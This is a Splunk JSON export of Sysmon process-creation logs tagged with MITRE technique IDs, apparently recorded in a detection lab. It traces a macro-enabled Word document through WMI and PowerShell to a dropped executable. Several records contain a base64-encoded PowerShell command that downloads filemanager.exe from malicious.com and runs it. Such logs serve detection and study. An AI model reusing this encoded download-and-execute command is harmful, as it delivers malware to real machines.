{"preview":true,"result":{"CommandLine":"C:\\Windows\\system32\\cmd.exe /c C:\\script.cmd","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Windows\\system32\\","Description":"Windows Command Processor","EventCode":"1","EventType":"4","FileVersion":"10.0.19041.746 (WinBuild.160101.0800)","Hashes":"SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18","Image":"C:\\Windows\\System32\\cmd.exe","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:46:46.356\r\nProcessGuid: {f589267d-b8a6-6032-6d18-000000002a00}\r\nProcessId: 7484\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\script.cmd\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {f589267d-b8a6-6032-6c18-000000002a00}\r\nParentProcessId: 9956\r\nParentImage: C:\\Users\\Public\\filemanager.exe\r\nParentCommandLine: \"C:\\Users\\Public\\filemanager.exe\"","OpCode":"Info","OriginalFileName":"Cmd.Exe","ParentCommandLine":"\"C:\\Users\\Public\\filemanager.exe\"","ParentImage":"C:\\Users\\Public\\filemanager.exe","ParentProcessGuid":"{f589267d-b8a6-6032-6c18-000000002a00}","ParentProcessId":"9956","ProcessGuid":"{f589267d-b8a6-6032-6d18-000000002a00}","ProcessId":"7484","Product":"Microsoft® Windows® Operating System","RecordNumber":"96259","RuleName":"technique_id=T1059.003,technique_name=Windows Command Shell","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:46:46.356","_raw":"02/21/2021 11:46:46 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96259\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:46:46.356\r\nProcessGuid: {f589267d-b8a6-6032-6d18-000000002a00}\r\nProcessId: 7484\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\script.cmd\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {f589267d-b8a6-6032-6c18-000000002a00}\r\nParentProcessId: 9956\r\nParentImage: C:\\Users\\Public\\filemanager.exe\r\nParentCommandLine: \"C:\\Users\\Public\\filemanager.exe\"","_time":"2021-02-21T11:46:46.000-0800","date_hour":"11","date_mday":"21","date_minute":"46","date_month":"february","date_second":"46","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=.,=__\\r:_-","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"\"C:\\Users\\Public\\filemanager.exe\"","Company":"-","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Windows\\system32\\","Description":"-","EventCode":"1","EventType":"4","FileVersion":"-","Hashes":"SHA1=85DD5FABDD7EFF31062F66D5F1BE1F4B6EDA0470,MD5=4C6A622EA6FD8571C55C7071965B836E,SHA256=D42974AB108A75E5CF71E1FE6E62C76ED3CB970486F32C0D7EAE54E0ACD93346,IMPHASH=E42CDB53F45F41A412F370ED95436A2A","Image":"C:\\Users\\Public\\filemanager.exe","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1036,technique_name=Masquerading\r\nUtcTime: 2021-02-21 19:46:46.321\r\nProcessGuid: {f589267d-b8a6-6032-6c18-000000002a00}\r\nProcessId: 9956\r\nImage: C:\\Users\\Public\\filemanager.exe\r\nFileVersion: -\r\nDescription: -\r\nProduct: -\r\nCompany: -\r\nOriginalFileName: -\r\nCommandLine: \"C:\\Users\\Public\\filemanager.exe\"\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=85DD5FABDD7EFF31062F66D5F1BE1F4B6EDA0470,MD5=4C6A622EA6FD8571C55C7071965B836E,SHA256=D42974AB108A75E5CF71E1FE6E62C76ED3CB970486F32C0D7EAE54E0ACD93346,IMPHASH=E42CDB53F45F41A412F370ED95436A2A\r\nParentProcessGuid: {f589267d-b8a2-6032-6318-000000002a00}\r\nParentProcessId: 11252\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -enco SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AZgBpAGwAZQBtAGEAbgBhAGcAZQByAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlADsAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlAA==","OpCode":"Info","OriginalFileName":"-","ParentCommandLine":"powershell.exe -enco SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AZgBpAGwAZQBtAGEAbgBhAGcAZQByAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlADsAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlAA==","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessGuid":"{f589267d-b8a2-6032-6318-000000002a00}","ParentProcessId":"11252","ProcessGuid":"{f589267d-b8a6-6032-6c18-000000002a00}","ProcessId":"9956","Product":"-","RecordNumber":"96258","RuleName":"technique_id=T1036,technique_name=Masquerading","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:46:46.321","_raw":"02/21/2021 11:46:46 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96258\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1036,technique_name=Masquerading\r\nUtcTime: 2021-02-21 19:46:46.321\r\nProcessGuid: {f589267d-b8a6-6032-6c18-000000002a00}\r\nProcessId: 9956\r\nImage: C:\\Users\\Public\\filemanager.exe\r\nFileVersion: -\r\nDescription: -\r\nProduct: -\r\nCompany: -\r\nOriginalFileName: -\r\nCommandLine: \"C:\\Users\\Public\\filemanager.exe\"\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=85DD5FABDD7EFF31062F66D5F1BE1F4B6EDA0470,MD5=4C6A622EA6FD8571C55C7071965B836E,SHA256=D42974AB108A75E5CF71E1FE6E62C76ED3CB970486F32C0D7EAE54E0ACD93346,IMPHASH=E42CDB53F45F41A412F370ED95436A2A\r\nParentProcessGuid: {f589267d-b8a2-6032-6318-000000002a00}\r\nParentProcessId: 11252\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -enco SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AZgBpAGwAZQBtAGEAbgBhAGcAZQByAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlADsAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlAA==","_time":"2021-02-21T11:46:46.000-0800","date_hour":"11","date_mday":"21","date_minute":"46","date_month":"february","date_second":"46","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=,=\\r:_--_:","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"powershell.exe -enco SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AZgBpAGwAZQBtAGEAbgBhAGcAZQByAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlADsAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlAA==","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Windows\\system32\\","Description":"Windows PowerShell","EventCode":"1","EventType":"4","FileVersion":"10.0.19041.546 (WinBuild.160101.0800)","Hashes":"SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2021-02-21 19:46:42.976\r\nProcessGuid: {f589267d-b8a2-6032-6318-000000002a00}\r\nProcessId: 11252\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -enco SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AZgBpAGwAZQBtAGEAbgBhAGcAZQByAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlADsAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlAA==\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\r\nParentProcessGuid: {f589267d-b863-6032-fe17-000000002a00}\r\nParentProcessId: 1848\r\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\r\nParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","OpCode":"Info","OriginalFileName":"PowerShell.EXE","ParentCommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","ParentImage":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","ParentProcessGuid":"{f589267d-b863-6032-fe17-000000002a00}","ParentProcessId":"1848","ProcessGuid":"{f589267d-b8a2-6032-6318-000000002a00}","ProcessId":"11252","Product":"Microsoft® Windows® Operating System","RecordNumber":"96245","RuleName":"technique_id=T1059.001,technique_name=PowerShell","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:46:42.976","_raw":"02/21/2021 11:46:42 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96245\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2021-02-21 19:46:42.976\r\nProcessGuid: {f589267d-b8a2-6032-6318-000000002a00}\r\nProcessId: 11252\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -enco SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AZgBpAGwAZQBtAGEAbgBhAGcAZQByAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlADsAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlAA==\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\r\nParentProcessGuid: {f589267d-b863-6032-fe17-000000002a00}\r\nParentProcessId: 1848\r\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\r\nParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","_time":"2021-02-21T11:46:42.000-0800","date_hour":"11","date_mday":"21","date_minute":"46","date_month":"february","date_second":"42","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=.,=\\r:_--_","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_wmic.docm\" /o \"\"","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\docs\\","Description":"Microsoft Word","EventCode":"1","EventType":"4","FileVersion":"16.0.13801.20160","Hashes":"SHA1=34FEDBE8BC105D887CD0A9806F22DA00B0D3A126,MD5=581D3C8191F703E7A10D833E5E11E42A,SHA256=7B365B3870A63AE247D22F599F178636F808388C4E43E2A3426545A86406C76D,IMPHASH=7F3EEE6930E62160D8989EDC51550522","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2021-02-21 19:46:40.210\r\nProcessGuid: {f589267d-b8a0-6032-5f18-000000002a00}\r\nProcessId: 11140\r\nImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nFileVersion: 16.0.13801.20160\r\nDescription: Microsoft Word\r\nProduct: Microsoft Office\r\nCompany: Microsoft Corporation\r\nOriginalFileName: WinWord.exe\r\nCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_wmic.docm\" /o \"\"\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=34FEDBE8BC105D887CD0A9806F22DA00B0D3A126,MD5=581D3C8191F703E7A10D833E5E11E42A,SHA256=7B365B3870A63AE247D22F599F178636F808388C4E43E2A3426545A86406C76D,IMPHASH=7F3EEE6930E62160D8989EDC51550522\r\nParentProcessGuid: {f589267d-9e74-6032-8100-000000002a00}\r\nParentProcessId: 5560\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE","OpCode":"Info","OriginalFileName":"WinWord.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentImage":"C:\\Windows\\explorer.exe","ParentProcessGuid":"{f589267d-9e74-6032-8100-000000002a00}","ParentProcessId":"5560","ProcessGuid":"{f589267d-b8a0-6032-5f18-000000002a00}","ProcessId":"11140","Product":"Microsoft Office","RecordNumber":"96235","RuleName":"technique_id=T1204,technique_name=User Execution","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:46:40.210","_raw":"02/21/2021 11:46:40 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96235\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2021-02-21 19:46:40.210\r\nProcessGuid: {f589267d-b8a0-6032-5f18-000000002a00}\r\nProcessId: 11140\r\nImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nFileVersion: 16.0.13801.20160\r\nDescription: Microsoft Word\r\nProduct: Microsoft Office\r\nCompany: Microsoft Corporation\r\nOriginalFileName: WinWord.exe\r\nCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_wmic.docm\" /o \"\"\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=34FEDBE8BC105D887CD0A9806F22DA00B0D3A126,MD5=581D3C8191F703E7A10D833E5E11E42A,SHA256=7B365B3870A63AE247D22F599F178636F808388C4E43E2A3426545A86406C76D,IMPHASH=7F3EEE6930E62160D8989EDC51550522\r\nParentProcessGuid: {f589267d-9e74-6032-8100-000000002a00}\r\nParentProcessId: 5560\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE","_time":"2021-02-21T11:46:40.000-0800","date_hour":"11","date_mday":"21","date_minute":"46","date_month":"february","date_second":"40","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=,=_\\r:_--_","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"lastrow":true,"result":{"CommandLine":"dtrace  -Fn \"tick-20sec {exit(0);} syscall:::entry {@[probefunc, execname, pid] = count();}\"","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\","Description":"DTrace/NT","EventCode":"1","EventType":"4","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Hashes":"SHA1=AB74FBAD656D45DE4411F0C48A0D12E02BF41586,MD5=FEDCA28AD0D2F057E229148218952A99,SHA256=0806EF4688C84A6066DA178563821F65C5F7464E024699DE3A0FE10C4152174E,IMPHASH=358351A0CEEDCB85263153101DBDA364","Image":"C:\\Program Files\\DTrace\\dtrace.exe","IntegrityLevel":"High","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-1d05-030000000000}","LogonId":"0x3051D","Message":"Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:46:38.674\r\nProcessGuid: {f589267d-b89e-6032-5618-000000002a00}\r\nProcessId: 1988\r\nImage: C:\\Program Files\\DTrace\\dtrace.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: DTrace/NT\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: dtrace.exe\r\nCommandLine: dtrace  -Fn \"tick-20sec {exit(0);} syscall:::entry {@[probefunc, execname, pid] = count();}\" \r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-1d05-030000000000}\r\nLogonId: 0x3051D\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=AB74FBAD656D45DE4411F0C48A0D12E02BF41586,MD5=FEDCA28AD0D2F057E229148218952A99,SHA256=0806EF4688C84A6066DA178563821F65C5F7464E024699DE3A0FE10C4152174E,IMPHASH=358351A0CEEDCB85263153101DBDA364\r\nParentProcessGuid: {f589267d-9f94-6032-7002-000000002a00}\r\nParentProcessId: 4844\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"","OpCode":"Info","OriginalFileName":"dtrace.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\"","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{f589267d-9f94-6032-7002-000000002a00}","ParentProcessId":"4844","ProcessGuid":"{f589267d-b89e-6032-5618-000000002a00}","ProcessId":"1988","Product":"Microsoft® Windows® Operating System","RecordNumber":"96234","RuleName":"technique_id=T1059.003,technique_name=Windows Command Shell","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:46:38.674","_raw":"02/21/2021 11:46:38 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96234\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:46:38.674\r\nProcessGuid: {f589267d-b89e-6032-5618-000000002a00}\r\nProcessId: 1988\r\nImage: C:\\Program Files\\DTrace\\dtrace.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: DTrace/NT\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: dtrace.exe\r\nCommandLine: dtrace  -Fn \"tick-20sec {exit(0);} syscall:::entry {@[probefunc, execname, pid] = count();}\" \r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-1d05-030000000000}\r\nLogonId: 0x3051D\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=AB74FBAD656D45DE4411F0C48A0D12E02BF41586,MD5=FEDCA28AD0D2F057E229148218952A99,SHA256=0806EF4688C84A6066DA178563821F65C5F7464E024699DE3A0FE10C4152174E,IMPHASH=358351A0CEEDCB85263153101DBDA364\r\nParentProcessGuid: {f589267d-9f94-6032-7002-000000002a00}\r\nParentProcessId: 4844\r\nParentImage: 